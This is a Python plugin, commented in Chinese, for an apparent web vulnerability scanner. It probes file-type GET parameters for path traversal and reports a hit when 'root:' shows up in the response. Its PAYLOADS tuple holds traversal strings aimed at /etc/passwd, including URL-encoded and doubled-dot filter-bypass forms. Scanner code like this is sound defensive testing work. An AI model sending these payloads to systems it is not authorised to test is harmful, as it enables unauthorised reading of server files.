"""路径穿越检测插件。

对文件读取类参数（path/file）注入若干穿越 payload，若响应中出现
``root:`` 这类明显的系统文件内容，则判定命中。payload 同时覆盖
明文与已编码两种写法；命中后保留实际请求 URL 与响应片段作为证据。
"""

from __future__ import annotations

from ..crawl import Page, set_query_param
from ..plugin import Finding, Plugin, register_plugin

FILE_PARAMETERS = frozenset({"path", "file", "filename"})

# 依次尝试：标准穿越、编码斜杠、双写绕过、目标向上一级
PAYLOADS: tuple[str, ...] = (
    "../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "../etc/passwd",
)

# 假 passwd 文件中必然出现的字段前缀；同时覆盖常见 Linux passwd 格式
HIT_MARKERS: tuple[str, ...] = ("root:",)


@register_plugin
class PathTraversalPlugin(Plugin):
    """目录穿越检测。"""

    name = "path_traversal"
    severity = "high"
    confidence = "high"
    description = "对文件读取参数注入目录穿越 payload，检查敏感文件内容"

    def match(self, page: Page) -> bool:
        return page.method.upper() == "GET" and any(
            parameter in FILE_PARAMETERS for parameter in page.params
        )

    def run(self, page: Page) -> list[Finding]:
        findings: list[Finding] = []
        for parameter in page.params:
            if parameter not in FILE_PARAMETERS:
                continue
            for payload in PAYLOADS:
                # encode=False：保留 ..%2f 这类已编码 payload 的原貌
                url = set_query_param(page.url, parameter, payload, encode=False)
                response = self._client.get(url)
                marker = self._detect(response.text)
                if marker is None:
                    continue
                findings.append(
                    self.make_finding(
                        url=url,
                        parameter=parameter,
                        payload=payload,
                        status_code=response.status_code,
                        body=response.text,
                        marker=marker,
                    )
                )
                break
        return findings

    @staticmethod
    def _detect(body: str) -> str | None:
        for marker in HIT_MARKERS:
            if marker in body:
                return marker
        return None
